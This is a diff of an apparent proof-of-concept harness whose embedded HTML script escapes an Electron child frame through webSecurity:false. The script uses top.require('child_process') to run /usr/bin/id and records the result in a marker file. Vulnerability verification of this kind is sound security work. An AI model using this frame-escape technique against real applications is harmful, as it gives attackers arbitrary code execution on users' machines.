@@ -18,13 +18,13 @@ def append(obj):
 # sanitizer. webSecurity:false lets this child reach the privileged top world.
 DIRECT_DOC = r'''<!doctype html><meta charset="utf-8"><script>
 try {
-  const fs = top.require('fs');
-  const cp = top.require('child_process');
-  const id = cp.execFileSync('/usr/bin/id', {encoding:'utf8'}).trim();
   const marker = top.process.env.NATIVE_DRAG_MARKER || '/tmp/native-html-drag-rce';
+  const fs = top.require('fs');
   fs.writeFileSync(marker,
-    'DIRECT_TOP_REQUIRE_ACE=1\\n' + id + '\\nNODE=' + top.process.versions.node +
+    'DIRECT_TOP_REQUIRE_REACHED=1\\nNODE=' + top.process.versions.node +
     '\\nELECTRON=' + top.process.versions.electron + '\\nTOP_URL=' + top.location.href + '\\n');
+  const id = top.require('child_process').execFileSync('/usr/bin/id', {encoding:'utf8'}).trim();
+  fs.appendFileSync(marker, 'ID=' + id + '\\nDIRECT_TOP_REQUIRE_ACE=1\\n');
   top.document.title = 'DIRECT_TOP_REQUIRE_ACE';
 } catch (e) {
   try { top.document.title = 'DIRECT_TOP_REQUIRE_ERROR:' + String(e); } catch (_) {}
